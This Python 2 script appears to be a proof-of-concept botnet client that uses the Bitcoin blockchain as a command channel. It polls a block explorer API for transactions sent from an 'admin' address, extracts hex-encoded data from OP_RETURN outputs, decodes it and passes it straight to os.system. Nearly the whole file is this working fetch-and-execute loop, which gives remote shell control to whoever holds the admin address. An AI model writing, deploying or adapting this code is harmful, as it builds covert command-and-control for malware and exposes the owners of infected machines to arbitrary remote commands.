# !/usr/bin/python2
# -*- coding: utf-8 -*-

from binascii import unhexlify
import urllib
import json
import os

URL = {
    "XTN": {
        "blockexplorer": {
            "address": "https://testnet.blockexplorer.com/api/addr/<ADDRESS>",
            "transactions": "https://testnet.blockexplorer.com/api/txs/?address=<ADDRESS>",
        }
    },
    "BTC":  {
        "blockexplorer": {
            "address": "https://blockexplorer.com/api/addr/<ADDRESS>",
            "transactions": "https://blockexplorer.com/api/txs/?address=<ADDRESS>",
        }
    },
}

def buildURL(address, netcode="XTN", provider="blockexplorer"):
    base_url = URL[netcode][provider]["transactions"]
    return base_url.replace("<ADDRESS>", address)

def getNewCommand(address, netcode="XTN"):
    url = buildURL(address, netcode=netcode)
    raw = urllib.urlopen(url).read()
    #mgiEN7RWEogjPFq5eAgK765kiibvc9sGNB
    data = json.loads(raw)
    #print json.dumps(data, indent=2)
    return data

if __name__ == "__main__":
    # Getting the network type
    network = raw_input("> Choose type of network (BTC, XTN, LTC, ...) [XTN]: ") or "XTN"
    print "\tNetwork: " + network

    # Getting the administrators address! Needed so as to prevent hijacking!
    admin = raw_input("> Type the ADMIN address: ")
    print "\tAdmin address: " + admin

    # Getting the address to be monitored
    #target = raw_input("> Type target address: ")
    target = admin
    print "\tTarget: " + target

    data = getNewCommand(target, network)

    print "> Info recovered from " + target
    print "> Transactions recovered: " + str(len(data["txs"]))

    for i, tx in enumerate(data["txs"]):
        print "> Processing transaction " + str(i+1) + "/" + str(len(data["txs"])) + "..."
        # Check if the emitter is the admin
        is_admin = False
        for v in tx["vin"]:
            if v["addr"] == admin:
                is_admin = True
                break
        # Exiting this transaction if no admin found
        if not is_admin:
            break

        for v in tx["vout"]:
            if "OP_RETURN" in v["scriptPubKey"]["asm"]:
                command = v["scriptPubKey"]["asm"].split(" ")[1]
                print "> Command found in OP_RETURN transaction:"
                print "\t" + unhexlify(command)
                print "> Running the command:"
                os.system(unhexlify(command))
                break
